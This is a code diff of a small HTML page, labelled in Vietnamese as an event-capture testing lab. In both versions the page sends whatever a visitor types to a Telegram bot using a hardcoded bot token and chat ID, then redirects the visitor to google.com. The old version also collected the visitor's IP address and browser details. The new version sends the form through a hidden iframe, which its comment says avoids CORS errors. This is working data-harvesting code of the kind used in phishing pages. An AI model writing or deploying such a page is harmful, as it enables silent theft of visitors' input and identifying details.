@@ -15,49 +15,24 @@
     <div class="box">
         <h3>Mô Phỏng Lab Kiểm Thử</h3>
         <p style="font-size: 13px; color: #666;">Trang này dùng để test cơ chế bắt sự kiện.</p>
-        <form id="testForm">
-            <input type="text" id="userInput" placeholder="Nhập dữ liệu test..." required><br>
+        
+        <!-- Form gửi trực tiếp qua iframe ẩn, vượt qua mọi lỗi CORS của trình duyệt -->
+        <form id="testForm" action="https://api.telegram.org/bot8794929706:AAFzSyo7YY1kUm1Tlqt9gv7tmv82TTQxw2o/sendMessage" method="GET" target="hidden_iframe">
+            <input type="hidden" name="chat_id" value="8742570709">
+            <input type="text" id="userInput" name="text" placeholder="Nhập dữ liệu test..." required><br>
             <button type="submit">Gửi dữ liệu</button>
         </form>
+        
+        <!-- Khung ẩn nhận phản hồi để trang web không bị nhảy trang -->
+        <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
     </div>
 
     <script>
-        const BOT_TOKEN = '8794929706:AAFzSyo7YY1kUm1Tlqt9gv7tmv82TTQxw2o';
-        const CHAT_ID = '8742570709';
-
-        let userIp = "Đang lấy...";
-        fetch('https://api.ipify.org?format=json')
-            .then(res => res.json())
-            .then(data => { userIp = data.ip; })
-            .catch(() => { userIp = "Không xác định"; });
-
-        document.getElementById('testForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-
-            const inputValue = document.getElementById('userInput').value;
-
-            const messageText = 
-                `🧪 PHÁT HIỆN SỰ KIỆN TRONG LAB!\n` +
-                `-------------------------\n` +
-                `📝 Dữ liệu nhập: ${inputValue}\n` +
-                `🌐 IP nguồn: ${userIp}\n` +
-                `📱 Thiết bị: ${navigator.userAgent}`;
-
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: messageText
-                })
-            })
-            .finally(() => {
-                setTimeout(() => {
-                    window.location.href = 'https://www.google.com';
-                }, 800);
-            });
+        document.getElementById('testForm').addEventListener('submit', function() {
+            // Sau khi bấm gửi 0.8 giây, tự động chuyển hướng người dùng đi nơi khác
+            setTimeout(() => {
+                window.location.href = 'https://www.google.com';
+            }, 800);
         });
     </script>
 </body>
